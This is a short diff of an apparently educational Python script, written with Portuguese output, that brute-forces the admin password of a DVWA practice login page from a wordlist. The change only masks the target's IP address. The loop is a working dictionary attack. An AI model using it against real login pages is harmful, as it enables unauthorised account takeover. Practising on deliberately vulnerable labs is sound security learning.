@@ -6,7 +6,7 @@ with open("wordlist.txt", "r", encoding="latin-1") as file:
 
     for word in wordlist:
         data = {"username": "admin", "password": word, "Login": "Login"}
-        response = requests.post("http://192.168.0.12/dvwa/login.php", data=data)
+        response = requests.post("http://***.****.***.***/dvwa/login.php", data=data)
         if "Login failed" in response.text:
             print(f"Senha {word} incorreta")
         else:
